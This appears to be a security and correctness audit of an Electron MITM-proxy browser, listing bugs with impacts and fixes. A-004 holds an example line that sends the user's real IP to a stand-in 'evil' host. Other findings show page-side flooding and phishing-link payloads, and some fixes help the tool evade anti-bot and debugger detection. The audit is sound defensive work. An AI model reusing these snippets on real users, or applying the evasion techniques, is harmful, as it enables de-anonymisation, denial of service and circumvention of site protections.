- **Where:** `bundle-utils.js:50` · **Category:** security · **Status:** open
- **Impact:** With the vault locked (the default after idle or screen lock, and in e2e runs), log in to any SPA that POSTs a JSON body {"password":"..."} or receives {"access_token":"..."}. The requests.request_body/response_body columns and the FTS index store the secrets in cleartext.
- **Fix:** Allow optional quotes around the key and value in bundle-utils.js:50, e.g. `/(["']?)((?:access_|refresh_|id_)?token|password|passwd|secret|client_secret|api[_-]?key)\1\s*[:=]\s*("(?:[^"\\]|\\.)*"|'[^']*'|[^\s&;,}]+)/gi`, keeping the key and quote in the replacement. Better: in redactBody, try `JSON.parse(bodyStr)`. If it parses to an object or array, walk it recursively, replace string values whose key matches looksSensitiveKey (plus access_token, refresh_token, client_secret) with mkMarker, then re-stringify.

#### A-023 🟠 Hydrated rows have OBJECT headers, but HAR/bundle/replay/editor/session-copy JSON.parse them as strings
- **Where:** `har-exporter.js:231` · **Category:** correctness · **Status:** open
- **Impact:** With the vault unlocked, record a session, then Export HAR: every entry has headers:[] and content.mimeType 'application/octet-stream'. Replay returns 'Unexpected token o in JSON'. 'Open in Request Editor' shows a blank GET. 'Create session from selection' copies rows with no headers.
- **Fix:** Add a tolerant helper, e.g. in bundle-utils: `function asHeaderObject(h){ if (!h) return {}; if (typeof h === 'object') return h; try { const o = JSON.parse(h); return o && typeof o === 'object' ? o : {}; } catch { return {}; } }`. Use it in har-exporter safeParseObj, bundle-utils normalizeRequestRow (in place of parseJsonSafely for headers), db.requestRowToInsertEntry, trace-har-ipc replay-request (line 207) and log-compare-execute-ipc fromDbRow (line 21).
- _Reported 2× (also: log-viewer)_

#### A-055 🟠 Shared-partition X-CupNet-Rid handler is re-registered per tab, so the rid prefix is always the last tab's id
- **Where:** `tab-manager.js:1397` · **Category:** correctness · **Status:** open
- **Impact:** Open tab A, then tab B in the same cookie group, and browse in A: rows without a CONNECT tab id are attributed to tab B, and tab-filtered views and WS frame matching by tab break.
- **Fix:** Install one partition-level handler per session (guard with a WeakSet) that resolves the tab per request: build a map from webContents.id to tabId in tab-manager (fill it in registerTabView/createTab, delete in closeTab), and in the handler use `const tid = wcIdToTabId.get(details.webContentsId) || 'unknown'`. Drop the tabId parameter. Remove the onBeforeSendHeaders(null) call from request-interceptor _removeAllHooks, since legacy hooks are gone and it only kills the rid handler, or re-call applyCupNetRidHeaderToSession after detach.
- _Reported 2× (also: tabs-shell-main)_

#### A-074 🟡 Startup crash when upgrading a DB whose requests table has no host column
- **Where:** `db.js:635` · **Category:** compat · **Status:** open
- **Impact:** A user upgrades from a build before commit 49f176d (before the requests.host column existed) and launches the app: startup throws 'no such column: host'.
- **Fix:** Remove `CREATE INDEX IF NOT EXISTS idx_requests_host ON requests(host);` from createSchema (db.js:635). migrateSchema already creates it at db.js:312 after the ALTER.

#### A-075 🟡 ws_message_count never increments in MITM mode; per-frame UPDATE scans the session
- **Where:** `db.js:1198` · **Category:** correctness · **Status:** open
- **Impact:** Record any WebSocket page: the handshake row's message counter in the log viewer stays 0. On a session with 100k rows and a 50 msg/s socket, the main thread does millions of row checks per second.
- **Fix:** Correlate by URL instead of the CDP id. For example, keep a per-connection cache in cdp-network-logging (connectionId -> handshake db id), resolved once with `SELECT id FROM requests WHERE session_id=? AND tab_id=? AND LOWER(type)='websocket' AND url IN (<_wsUrlVariants(url)>) ORDER BY id DESC LIMIT 1`. After that, UPDATE by primary key `WHERE id=?`. Also add `CREATE INDEX IF NOT EXISTS idx_requests_session_reqid ON requests(session_id, request_id)`.
- _Reported 2× (also: log-viewer)_

#### A-076 🟡 delete-unnamed-sessions deletes active external-proxy sessions (their later inserts fail the FK)
- **Where:** `db.js:943` · **Category:** data-loss · **Status:** open
- **Impact:** Start an external proxy port, generate traffic, then click 'Delete unnamed sessions' in the Log Viewer: the external session disappears and every later request through that port is dropped.
- **Fix:** In listUnnamedSessionIds, add `AND ended_at IS NULL IS NOT 1`, or more narrowly `AND NOT (source = 'external' AND ended_at IS NULL)`. Alternatively, have the 'delete-unnamed-sessions' handler pass the ids of all ctx.activeExtPorts entries (entry.sessionId) as extra keep ids, e.g. `AND id NOT IN (...)`.

#### A-079 🟡 HAR export: CDP '<base64|mime|..>' bodies exported as text, and truncated base64 gets text appended
- **Where:** `har-exporter.js:93` · **Category:** correctness · **Status:** ✅ FIXED 2026-09-23 — HAR parses CDP base64 bodies, no base64 truncation.
- **Impact:** Export a session with images served from cache or TLS passthrough (CDP rows) or bodies over 1 MiB: the HAR viewer shows garbage, or fails to decode content.text.
- **Fix:** Change _parseB64Prefix to return {b64, mime}. For '__b64__:' return {b64: body.slice(8), mime:null}. For '<base64|mime|M|DATA>' strip the trailing '>', split, and return {b64: parts.slice(2).join('|'), mime: parts[1]}. Use that mime in content.mimeType when the header is missing. For base64 bodies, do not call truncateExportText. Either leave them untruncated, or cut to `max - (max % 4)` characters and add `_cupnetTruncated: true` (and `comment`) to the content object instead of appending plain text.
- _Reported 2× (also: same area)_

#### A-108 🟡 compare-run silently compares unrelated requests when the anchor is not among the newest 10000 rows
- **Where:** `main-process/ipc/handlers/log-compare-execute-ipc.js:196` · **Category:** correctness · **Status:** open
- **Impact:** In a 30k-request session, pick an early request as the left anchor and run Compare: the viewer shows 11 unrelated pairs scored and diffed as if they were the anchor's neighbourhood.
- **Fix:** In compare-run, after computing leftPos/rightPos, add `if (leftPos < 0 || rightPos < 0) return { success:false, error:'Anchor request not found in session window' };`. Better: add a db helper that selects `WHERE session_id=? AND id>=? ORDER BY id ASC LIMIT ?`, hydrates the rows, and is called with (left.session_id, left.id, LEFT_COUNT) and (right.session_id, right.id, RIGHT_SEARCH). That removes the 10k window entirely.
- _Reported 2× (also: log-viewer)_

#### A-120 🟡 Tabs from the toolbar '+' / 'new-tab' IPC never get CDP logging and create orphan sessions
- **Where:** `main-process/ipc/handlers/tabs-ipc.js:13` · **Category:** correctness · **Status:** open
- **Impact:** With Rec on, click '+' and open a WebSocket app: HTTP rows appear (via MITM), but the Messages tab is empty and no page-load screenshots are taken for that tab.
- **Fix:** Extract one helper, e.g. ctx.createLoggedTab(opts): call tabManager.createTab({...opts, proxyRules: ctx.persistentAnonymizedProxyUrl || null, existingSessionId: ctx.currentSessionId}), then get the tab and call ctx.setupNetworkLogging(tab.view.webContents, tabId, ctx.currentSessionId) and ctx.interceptor.attachToSession(tab.tabSession, tabId), each wrapped in try/catch. Use it in 'new-tab' and 'open-settings-tab' (and the menu and open-in-new-tab paths).
- _Reported 2× (also: tabs-shell-main)_

#### A-123 🟡 extraInfoQueue grows without bound (stale sweep checks _addedAt, which is never set)
- **Where:** `main-process/services/cdp-network-logging.js:900` · **Category:** leak · **Status:** open
- **Impact:** Leave a tab with analytics/ads recording for hours: the per-webContents Map collects tens of thousands of header objects and main-process memory keeps climbing until the tab is closed or Clear is pressed.
- **Fix:** At :803, use `const q = [extraHeaders]; q._addedAt = Date.now(); extraInfoQueue.set(params.requestId, q);`. In loadingFinished and loadingFailed, call `extraInfoQueue.delete(params.requestId)` without the `if (entry ...)` guard, so filtered and untracked requests are cleaned up too.
- _Reported 2× (also: same area)_

#### A-124 🟡 The Activity Monitor CDP domains (Runtime/Log/DOMStorage) are never disabled; CDP stays attached after Rec stops
- **Where:** `main-process/services/cdp-network-logging.js:288` · **Category:** security · **Status:** open
- **Impact:** The user enables the Activity Monitor once, then disables it or stops Rec, and visits a Turnstile-protected site: the Runtime domain is still enabled on that tab, the page detects the debugger, and the challenge fails.
- **Fix:** In setupNetworkLogging after Network.enable, add an else branch to `if (activityMonitorOn)` that sends Runtime.disable, Log.disable and DOMStorage.disable, each with .catch. In toggle-logging-stop, for each tab, if no active fingerprint then detach the debugger (remove the message/detach listeners, dbg.detach(), _cdpAttachedWc.delete). Otherwise send Runtime/Log/DOMStorage.disable and re-send Network.enable with maxTotalBufferSize/maxResourceBufferSize = 0. Also let setupNetworkLogging reach the disable path when it would otherwise return early at :150 while CDP is already attached.

#### A-125 🟡 Hostile-site CDP detach misses omnibox/loadURL navigations and server redirects
- **Where:** `main-process/services/cdp-network-logging.js:93` · **Category:** correctness · **Status:** open
- **Impact:** Type a hostile-site URL in the omnibox: will-navigate does not fire, the page's early anti-debug script sees the attached debugger, and detection triggers. After detach, Intl reports the real timezone instead of the profile's.
- **Fix:** In registerDevtoolsHostileNavigationGuard, add `webContents.on('did-start-navigation', (e) => { if (e.isMainFrame && !e.isSameDocument) detachIfHostile(e.url, 'devtools-hostile.did-start-navigation'); })` (Electron 34 passes a details object). Also add `webContents.on('will-redirect', (e) => { if (e.isMainFrame) detachIfHostile(e.url, 'devtools-hostile.will-redirect'); })`. Optionally, in tab-manager `_loadTabUrl`, detach before calling loadURL when isDevtoolsHostileUrl(target). The timezone on hostile sites needs a non-CDP path, such as a preload Intl shim; that is a separate design item.

#### A-145 🟡 Screenshots are captured and the UI flashes even when not recording
- **Where:** `main-process/services/screenshot-service.js:72` · **Category:** perf · **Status:** ✅ FIXED 2026-09-23 — non-manual captures skipped when not recording.
- **Impact:** With Rec off, typing in forms triggers repeated full-page captures and a visual flash, and CPU spikes on large displays.
- **Fix:** At the top of captureScreenshot, add `if (!getIsLoggingEnabled?.() || !getCurrentSessionId?.() || !getDb?.()) return { success:false, skipped:true, reason:'not_recording' };` so it runs before capturePage (or do the same in requestScreenshot unless force is set). Move the 'screenshot-taken' send inside the `if (isLoggingEnabled && currentSessionId && db)` block, after the insert succeeds.

#### A-185 🟡 Raw-SQL readers (egress meta, site ZIP, list/FTS) bypass hydration and lose encrypted data _(WIP)_
- **Where:** `session-egress-meta.js:41` · **Category:** data-loss · **Status:** open
- **Impact:** Fix the encrypt leak, unlock the vault, and record a site. Export site ZIP gives files:0. The HAR creator.comment says 'Egress IP: unknown'. The log list shows the cupnet session rows without a body.
- **Fix:** Fix the leak in db.js insertRequest: when e.log_encrypted is set, stop falling back to camelCase fields (use e.request_headers/e.response_headers/e.request_body/e.response_body as returned, even if null). At the same time: (a) session-egress-meta.js: add log_encrypted, response_body_enc to the SELECT and pass each row through require('./main-process/services/traffic-log-crypto.js').hydrateRequestLogRow. Or exempt type='cupnet' rows from encryption in prepareRequestLogFields (skip when entry.type==='cupnet'), since their bodies are not sensitive. (b) site-snapshot-export.js: SELECT the *_enc columns plus log_encrypted and hydrate each iterated row before siteExportRowInfo/decodeResponseBody. (c) queryRequests: SELECT response_headers_enc/log_encrypted and hydrate, or return only a hydrated content-type. (d) FTS: document it as URL-only for encrypted rows, or keep a separate index.
- _Reported 2× (also: proxy)_

#### A-235 ⚪ deleteEmptySessions at startup deletes sessions that only contain screenshots/console/WS data
- **Where:** `db.js:1007` · **Category:** data-loss · **Status:** open
- **Impact:** Record a session where only screenshots and Activity Monitor console/storage events were captured (e.g. MITM off, or every request filtered), then restart the app: the whole recording is gone.
- **Fix:** Replace the query with `DELETE FROM sessions WHERE NOT EXISTS (SELECT 1 FROM requests r WHERE r.session_id = sessions.id) AND NOT EXISTS (SELECT 1 FROM screenshots s WHERE s.session_id = sessions.id) AND NOT EXISTS (SELECT 1 FROM ws_events w WHERE w.session_id = sessions.id) AND NOT EXISTS (SELECT 1 FROM browser_events b WHERE b.session_id = sessions.id) AND NOT EXISTS (SELECT 1 FROM console_logs c WHERE c.session_id = sessions.id) AND (notes IS NULL OR TRIM(notes) = '') AND COALESCE(source,'') != 'external'`, plus the keepId clause. Guard the console_logs clause if that table may be missing on old DBs.

#### A-243 ⚪ HAR: one WS handshake per URL gets the frames of every connection to that URL (duplicates)
- **Where:** `har-exporter.js:138` · **Category:** correctness · **Status:** open
- **Impact:** A page reconnects its WebSocket 5 times: the HAR has 5 websocket entries, each carrying the full frame set of all 5 connections.
- **Fix:** Store the handshake's time window and filter frames by it. In buildHarEntryFromRow, pass created_at bounds: frames with created_at >= this handshake's created_at and < the next websocket handshake row to the same url/session. The more exact option is to correlate the CDP webSocketCreated requestId onto the handshake row and pass it as connectionId. Also drop the tab_id equality when the handshake tab_id came from the active-tab fallback (or match on session+url only).

#### A-274 ⚪ clearBrowserCacheOnRecStart is a no-op (tabManager.clearHttpCacheForAllTabSessions does not exist)
- **Where:** `main-process/ipc/handlers/db-logging-ipc.js:6` · **Category:** correctness · **Status:** open
- **Impact:** Browse a site, press Rec, reload: cached JS/CSS/images do not show up as MITM rows. The recording is incomplete compared with what the page loaded.
- **Fix:** Add to tab-manager: `async clearHttpCacheForAllTabSessions(){ const seen=new Set(); for (const t of this.getAllTabs()) { const s=t.tabSession; if (!s||seen.has(s)) continue; seen.add(s); try { await s.clearCache(); } catch {} } }` (and expose it on the ctx.tabManager object). Alternatively, revert cdp-network-logging.js:258 to `{ cacheDisabled: !!loggingEnabled }`.

#### A-275 ⚪ browser-storage-activity accepts unbounded, unthrottled payloads from any website _(WIP)_
- **Where:** `main-process/ipc/handlers/db-logging-ipc.js:246` · **Category:** security · **Status:** open
- **Impact:** A malicious page calls cupnetStorageActivity.report({key:'x',newValue:'A'.repeat(2e6)}) in a tight loop: each call adds a 2 MB row and a broadcast, the low-priority queue saturates (5000 cap), and the Activity Monitor data becomes untrustworthy.
- **Fix:** In the handler: keep a per-wcId token bucket (e.g. Math.max(1, s.activityMonitorRateLimit) events/sec) and drop anything over it. Before stringifying, truncate key to 1 KB and newValue and stack to 16 KB each (String(x).slice(0, N)). Optionally require a per-tab nonce that tab-manager injects into the storage-wrapper script and that the handler checks.

#### A-278 ⚪ execute-request (net.fetch fallback): no timeout or cancel while reading the response body _(WIP)_
- **Where:** `main-process/ipc/handlers/log-compare-execute-ipc.js:512` · **Category:** correctness · **Status:** open
- **Impact:** Execute a request to an SSE/long-poll endpoint: the editor spinner never stops and the Cancel button does nothing.
- **Fix:** Move clearTimeout(timer) and cleanupExec() into a finally block after `const text = await resp.text()`, and race resp.text() against cancelPromise (ctrl.abort() also aborts the body stream). Add `let timedOut = false; const timer = setTimeout(() => { timedOut = true; ctrl.abort(); }, timeoutMs);` and report `error: timedOut ? 'Timeout after '+timeoutMs+'ms' : 'Cancelled'`.

#### A-295 ⚪ Replay sends the literal '__b64__:' marker as the body and uses net.fetch instead of the MITM worker _(WIP)_
- **Where:** `main-process/ipc/handlers/trace-har-ipc.js:216` · **Category:** correctness · **Status:** open
- **Impact:** Replay a logged file-upload or gzip POST: the server gets a body starting with '__b64__:' and returns 400. Replaying a row logged while the vault was locked sends 'Bearer <REDACTED:bearer,len=..>'.
- **Fix:** Either delete the unused 'replay-request' handler and its preload binding (and update the e2e tests), or fix it. To fix: parse headers with `typeof h === 'string' ? JSON.parse(h) : (h || {})`. Return {success:false,error:'Log locked'} when req._locked is set, and refuse or warn when headers or body contain '<REDACTED:'. Decode '__b64__:' and '<base64|mime|..|DATA>' to a Buffer. Send through ctx.mitmProxy.worker.request, the way execute-request does, and use net.fetch only as a fallback when the worker is not ready.
- _Reported 2× (also: tool-windows-a)_

#### A-297 ⚪ Non-MITM CDP path: _processLogQueue deletes the in-flight redirect target entry
- **Where:** `main-process/services/cdp-network-logging.js:429` · **Category:** correctness · **Status:** open
- **Impact:** With the MITM proxy not running (getMitmProxy() null, e.g. MITM failed to start), a 302 -> 200 chain logs only the 302 and the final 200 response is lost.
- **Fix:** In _processLogQueue, replace `ongoingRequests.delete(reqKey);` with `if (ongoingRequests.get(reqKey) === logEntry) ongoingRequests.delete(reqKey);`. The line can also simply be removed, since loadingFinished (818), loadingFailed (867) and the redirect branch (740) already delete their entries.

#### A-298 ⚪ MITM-mode CDP shadow merges redirect-hop extra headers into the final response and keeps the first URL
- **Where:** `main-process/services/cdp-network-logging.js:714` · **Category:** correctness · **Status:** open
- **Impact:** On a TLS-passthrough or rid-less 302 -> 200 request, the log gets an extra CDP row with the original URL, status 200 and the 302's Location header.
- **Fix:** In the MITM branch, on redirectResponse: take the existing shadow's `_addedAt` if needed, then `ongoingRequests.delete(requestId); extraInfoQueue.delete(requestId);` and fall through to create a fresh shadow for request.url (do not return early). In loadingFinished use the last queued headers: `const extraH = queue.length ? queue[queue.length - 1] : (entry._extraHeaders || {});`

#### A-299 ⚪ getResponseBody timeout timers are never cleared
- **Where:** `main-process/services/cdp-network-logging.js:837` · **Category:** leak · **Status:** open
- **Impact:** A page with 2000 requests leaves about 2000 pending timers holding closures. Main-process timer churn and memory rise under heavy browsing.
- **Fix:** `let t; try { rb = await Promise.race([cdp.sendCommand('Network.getResponseBody',{requestId:rid}), new Promise((_,rej)=>{ t=setTimeout(()=>rej(new Error('getResponseBody timeout')), bodyTimeoutMs); })]); break; } catch(err){...} finally { clearTimeout(t); }`. Before the body loop, for `entry._mitmCdpShadow`, compute the rid from `entry._cupnetRid || _cupnetRidFromHeaders(entry.request?.headers)` and check the dedup map without claiming it (add a `isRidClaimed(rid)` helper to mitm-cdp-dedup.js, or `shouldSkipCdpShadowAsMitmDuplicate` when there is no rid). If the rid is already claimed, skip getResponseBody.

#### A-300 ⚪ websocket_closed meta always reports frames:0
- **Where:** `main-process/services/cdp-network-logging.js:696` · **Category:** correctness · **Status:** open
- **Impact:** Close a WebSocket after 500 messages: the closed meta says frames:0. Binary frames appear as base64 gibberish in HAR _webSocketMessages marked as text.
- **Fix:** Initialize `frameCount: 0` instead of `frames: []`, run `ws.frameCount++` in both frame handlers, and use `framesCount: ws.frameCount`. For opcode, pass `opcode: params.response.opcode` into the log entry. Store it with the payload (for example a `__b64__:` prefix when opcode===2, which mitm-proxy already uses for binary bodies) and have har-exporter emit opcode 2 for such frames.

#### A-301 ⚪ CDP UA override is sent without userAgentMetadata (UA vs Client Hints mismatch)
- **Where:** `main-process/services/cdp-network-logging.js:270` · **Category:** compat · **Status:** open
- **Impact:** With a fingerprint profile whose UA is Chrome/Windows, navigator.userAgentData still reports the Electron/Chromium brands and platform, and sites flag the inconsistency.
- **Fix:** Build userAgentMetadata from the resolved profile UA (parse Chrome major/full version and platform) and pass it in the same call: `userAgentMetadata: { brands: [{brand:'Chromium',version:M},{brand:'Google Chrome',version:M},{brand:'Not)A;Brand',version:'99'}], fullVersionList: [...same with full version...], fullVersion, platform: 'Windows'|'macOS'|'Linux', platformVersion, architecture: 'x86', model: '', mobile: false, bitness: '64' }`. Put this in a helper in user-agent-utils.js so it can be reused.

#### A-319 ⚪ Encrypted bodies bypass the 50 MB body cap
- **Where:** `main-process/services/traffic-log-crypto.js:86` · **Category:** perf · **Status:** open
- **Impact:** Download a 500 MB file with the vault unlocked: a 500 MB encrypted BLOB is written synchronously on the main thread, and opening its detail pushes about 1 GB through IPC.
- **Fix:** In prepareRequestLogFields, cap both bodies before redaction or encryption: `const MAX=50*1024*1024; if (typeof reqBody==='string' && reqBody.length>MAX) reqBody=reqBody.slice(0,MAX); if (typeof resBody==='string' && resBody.length>MAX) resBody=resBody.slice(0,MAX);`. Alternatively, export MAX_BODY_BYTES/_truncBody from db.js and use it there. In hydrateRequestLogRow, after decrypting, `delete out.request_headers_enc; delete out.response_headers_enc; delete out.request_body_enc; delete out.response_body_enc;`. Also strip them in the `_locked` branch.

#### A-320 ⚪ Rows decrypted with a different profile's key or while locked are exported silently empty _(WIP)_
- **Where:** `main-process/services/traffic-log-crypto.js:116` · **Category:** data-loss · **Status:** open
- **Impact:** Record under profile A, switch to profile B, then export the HAR or copy the selection into a new session: the entries have empty headers and bodies, and nothing in the UI or file says they were undecryptable.
- **Fix:** In _decText, return a sentinel or set a flag on failure. In hydrateRequestLogRow, set out._decryptFailed = true when any *_enc blob is present but decrypt returned null. In createSessionFromRequestIds*, when row.log_encrypted is set and the row is _locked or _decryptFailed, copy request/response *_enc blobs and log_encrypted verbatim with a raw INSERT rather than going through requestRowToInsertEntry/insertRequest. In HAR/bundle/replay export, skip or annotate those rows (e.g. comment 'undecryptable') and report a count to the UI. For the long-term fix, add a requests.vault_id column written in prepareRequestLogFields.

#### A-378 ⚪ Site ZIP: '/dir/' and '/dir/x' paths conflict, query variants overwrite each other, and the stream is left open on error
- **Where:** `site-snapshot-export.js:174` · **Category:** correctness · **Status:** open
- **Impact:** A session with GET /docs/ (HTML) and /docs/app.js produces a ZIP that fails to extract on macOS/Windows ('file exists'/'not a directory').
- **Fix:** In zipEntryNameFromUrl: if pathname ends with '/', push 'index.html'. When the query string is non-empty, append a short hash of u.search before the extension. In collectSiteFilesByPath, when a file path is also a directory prefix of another entry, rename the file to '<path>/index.html'. In the export-site-zip catch: `try { output.destroy(); } catch {} try { ctx.fs.unlinkSync(filePath); } catch {}`. Also pass rows through hydrateRequestLogRow (SELECT the *_enc and log_encrypted columns too) so encrypted rows are exported.

### Core runtime & IPC

#### A-004 🔴 Any website can read the user's real (unproxied) IP via window.electronAPI.getDirectIp() _(WIP)_
- **Where:** `main-process/ipc/handlers/misc-ipc.js:209` · **Category:** security · **Status:** open
- **Impact:** The user browses through a paid proxy to stay anonymous. Any page runs `window.electronAPI.getDirectIp().then(r => fetch('https://evil/?ip=' + r.ip))` and receives the user's real home IP and ISP, defeating the purpose of CupNet. A loop of calls spawns hundreds of hidden BrowserWindows.
- **Fix:** In misc-ipc.js, proxy-ipc.js (get-current-proxy, connect-proxy-template), tabs-ipc.js (get-tabs), cookies-dns-ipc.js (set-tab-proxy) and ext-proxy-ipc.js (all ext-proxy:* handlers), wrap the handler: ctx.ipcMain.handle(ch, guardIpcHandler(ch, fn)). new-tab.html runs in a tab and legitimately calls getDirectIp/getCurrentProxy, so for those two channels use a sender check instead: allow only when event.sender is a trusted shell or event.sender.getURL() starts with getInternalPageUrl('new-tab'). In preload-view.js, expose these methods only when location.protocol === 'file:' and the path ends in new-tab.html. Make get-direct-ip single-flight with a cached result for about 60s, and wrap loadURL in Promise.race with a 10s timeout that destroys the window.
- _Reported 2× (also: proxy)_

#### A-026 🟠 trustMitmCA accepts every certificate on all sessions, so no layer validates upstream TLS
- **Where:** `main-process/cupnet-runtime.js:949` · **Category:** security · **Status:** open
- **Impact:** The user routes traffic through a third-party rotating proxy. A malicious proxy operator, or anyone on the path, presents a self-signed certificate for bank.com or challenges.cloudflare.com. Chromium (verify proc returns 0) and the Go worker (InsecureSkipVerify) both accept it, so credentials and cookies are silently intercepted and no warning is shown.
- **Fix:** Load the CupNet CA DER and its SHA-256 fingerprint at startup. In the verify proc: (req, cb) => { const chain = req.certificate; if (issuerCert(chain)?.fingerprint === CUPNET_CA_FP) return cb(0); cb(-3); }, where -3 uses Chromium's default verification. For hosts that are tunnelled (tlsPassthroughDomains) or not proxied, always return -3. In the certificate-error handler, replace the /CupNet MITM/ regex with the same issuer-fingerprint comparison. In azuretls-go/request.go, drop InsecureSkipVerify=true by default and enable it only through an explicit per-request or per-rule flag, such as an env or NDJSON field.
- _Reported 2× (also: x-security)_

#### A-027 🟠 MITM restart drops per-tab upstream proxies (IP leak) and leaves external ports bound to the stopped proxy
- **Where:** `main-process/cupnet-runtime.js:1120` · **Category:** race · **Status:** open
- **Impact:** Tab A is set to proxy profile 'DE residential' while the global route is direct. The user clicks Restart MITM. The new MitmProxy has an empty _tabProxyMap, so tab A's traffic now leaves through the global (direct) route and exposes the real IP. At the same time, an external client using port 7777 gets 502s until the app restarts.
- **Fix:** (1) Add `let _mitmLifecycle = null;` and have startMitmWithRetry and restartMitmProxy both do `if (_mitmLifecycle) return _mitmLifecycle; _mitmLifecycle = (async()=>{...})().finally(()=>{_mitmLifecycle=null;})`, then assign mitmStartPromise = _mitmLifecycle. (2) At the end of wireMitmAfterStart, loop tabManager.getAllTabs() and, for tabs with proxyProfileId, call the same resolve plus proxy.setTabUpstream(tab.id, {...}) logic, either by exporting applyMitmAndFingerprintForTabProxy through ctx or by moving the tab upstream map outside the MitmProxy instance. (3) After restart, run `for (const {instance} of activeExtPorts.values()) instance.parent = proxy;`.
- _Reported 3× (also: x-lifecycle, proxy)_

#### A-093 🟡 page-gateway-error is never delivered: proxy-service reads d.getMainWindow, which the runtime does not pass
- **Where:** `main-process/cupnet-runtime.js:540` · **Category:** ipc-contract · **Status:** open
- **Impact:** The upstream proxy returns a gateway failure for the active tab (dead proxy, auth error). The MITM produces the error, but the browser shell's gateway-error UI or notice never appears.
- **Fix:** Add `getMainWindow: () => mainWindow,` to the createProxyMitmService({...}) deps object in main-process/cupnet-runtime.js (L540-575).
- _Reported 2× (also: x-ipc-contract)_

#### A-094 🟡 Cancelling Cmd+Q permanently stops MITM monitoring and tracking timers
- **Where:** `main-process/cupnet-runtime.js:1051` · **Category:** correctness · **Status:** open
- **Impact:** The user presses Cmd+Q and clicks Cancel. From then on stabilityMetrics gauges freeze, SLO warnings stop, the 'network-pending' and 'mouse-activity' screenshots never fire, the 'mitm-stats-update' push stops, and the appCtx snapshot tick used by E2E and debug scripts stops.
- **Fix:** Remove both app.on('before-quit', ...) registrations from startMitmMonitoringIntervals. In the existing app.on('will-quit') handler (L1458), add `if (_statsBroadcastTimer) { clearInterval(_statsBroadcastTimer); _statsBroadcastTimer = null; } if (_mouseTrackingTimer) { clearInterval(_mouseTrackingTimer); _mouseTrackingTimer = null; }`. If those variables are not in scope there, register a single will-quit listener once.
- _Reported 2× (also: x-lifecycle)_

#### A-095 🟡 A startup failure in whenReady leaves a windowless zombie process that holds the single-instance lock
- **Where:** `main-process/cupnet-runtime.js:831` · **Category:** error-handling · **Status:** open
- **Impact:** After upgrading Electron without rebuilding native modules, the app shows nothing on launch. Launching it again also does nothing. The user has to kill the CupNet process by hand, and critical.log contains only an 'error' line.
- **Fix:** Chain `.catch((e) => { const msg = e?.stack || String(e); sysLog('critical', 'startup', 'whenReady failed: ' + msg); try { dialog.showErrorBox('CupNet failed to start', msg); } catch {} app.exit(1); })` onto the whenReady promise at cupnet-runtime.js:1440. Optionally, in index.js uncaughtException, call app.exit(1) when BrowserWindow.getAllWindows().length === 0 and startup has not completed.

#### A-096 🟡 Closing the profile gate and cancelling the exit prompt leaves an invisible process; second-instance cannot recover it
- **Where:** `main-process/cupnet-runtime.js:1442` · **Category:** ux-broken · **Status:** open
- **Impact:** Windows: at the profile picker the user presses Alt+F4, and the prompt 'Close [CupNet] and all windows?' appears. They click Cancel, and the process stays alive with no UI. Double-clicking the CupNet icon again does nothing.
- **Fix:** In before-quit, skip the prompt when there is no mainWindow or no visible window: `const hasVisible = BrowserWindow.getAllWindows().some(w => !w.isDestroyed() && w.isVisible()); if (!mainWindow || mainWindow.isDestroyed() || !hasVisible) { forceAppQuit = true; return; }`. In index.js second-instance, prefer mainWindow if it is visible, then the profile gate (profileGateApi.getProfileGateWindow()), otherwise create the gate, or the main window if a profile is active (expose a hook from cupnet-runtime).
- _Reported 2× (also: x-lifecycle)_

#### A-097 🟡 Profile login does not re-apply runtime side effects; MITM TLS profile, CORS, traffic filters and paste-unlock keep the global values
- **Where:** `main-process/cupnet-runtime.js:1360` · **Category:** correctness · **Status:** open
- **Impact:** Profile B has tlsProfile='firefox' and CORS bypass on, and the global file has chrome with CORS off. After logging into B, get-tls-profile and the Settings UI show firefox with CORS on, but the MITM keeps sending the Chrome fingerprint with CORS off until the app restarts. That is a fingerprint mismatch between what is shown and what is sent.
- **Fix:** Add an applyProfileRuntimeSettings() in cupnet-runtime and call it from onProfileLoggedIn, onProfileSwitchGate and after profile-logout. It should do: `const s = loadSettings(); const p = s.tlsProfile || 'chrome'; mitmProxy?.setBrowser(p); broadcastTlsProfileChanged(p); mitmProxy?.setGlobalCorsEnabled?.(!!s.corsBypassEnabled); tabManager.setPasteUnlock(s.pasteUnlock !== false); applyTrafficFilters(s.trafficOpts || {}); tabManager.applyDevicePermissions(); vaultSession.initFromSettings(s);`. Alternatively, export and reuse applySettingsSideEffects from settings-toolbar-ipc.js and add the setBrowser call.
- _Reported 2× (also: vault-security)_

#### A-110 🟡 set-ui-pref is callable from any website with no key or size validation and a synchronous fsync write per call _(WIP)_
- **Where:** `main-process/ipc/handlers/misc-ipc.js:97` · **Category:** security · **Status:** ✅ PARTIALLY FIXED 2026-09-23 — key/value size bounded (DoS); sender restriction deferred to WIP trusted-sender.
- **Impact:** A malicious site calls setUiPref('cupnet-quick-links-v2', [{title:'Bank', url:'https://phish.example'}]); the user's new-tab quick links now point to phishing pages. A loop of setUiPref('k'+i, 'x'.repeat(1e6)) makes every write multi-MB with fsync, freezing the main process and filling the disk.
- **Fix:** In misc-ipc.js, allow set-ui-pref when isTrustedShell(event.sender) is true. From tab senders, allow it only when event.senderFrame.url is the internal new-tab.html file URL, and only for the key 'cupnet-quick-links-v2'. Apply the same check to get-ui-pref. Require typeof key === 'string' && key.length <= 128, and reject values whose JSON.stringify length exceeds about 64KB. Debounce the ui-prefs write, e.g. 300ms, using writeFileSecureAsync.

#### A-121 🟡 Websites can drive unbounded screenshot capture through synthetic events (skipRateLimit) _(WIP)_
- **Where:** `main-process/ipc/handlers/tracking-ipc.js:40` · **Category:** security · **Status:** open
- **Impact:** A page runs `setInterval(() => { document.body.style.background = '#'+Math.random().toString(16).slice(2,8); dispatchEvent(new PointerEvent('pointerdown', {clientX:1, clientY:1})) }, 10)`. The main process spends its time in capturePage, and with logging on the DB grows by hundreds of MB per minute.
- **Fix:** In preload-view.js, add `if (!ev.isTrusted) return;` to the pointerdown, mousedown, input and keydown listeners. In screenshot-service.requestScreenshot, keep skipRateLimit bypassing only the per-reason cooldown and still enforce maxPerMinute. Alternatively, add a per-tab minimum interval of 300-500ms for click and typing-end. Also add a single in-flight guard in captureScreenshot so concurrent captures are dropped.

#### A-132 🟡 sanitizeProxyUrl rejects 'host:port' and 'user:pass@host:port' without a scheme, which breaks proxy failover
- **Where:** `main-process/services/network-helpers.js:27` · **Category:** correctness · **Status:** ✅ FIXED 2026-09-23 — sanitizeProxyUrl handles scheme-less host:port; returns normalized URL.
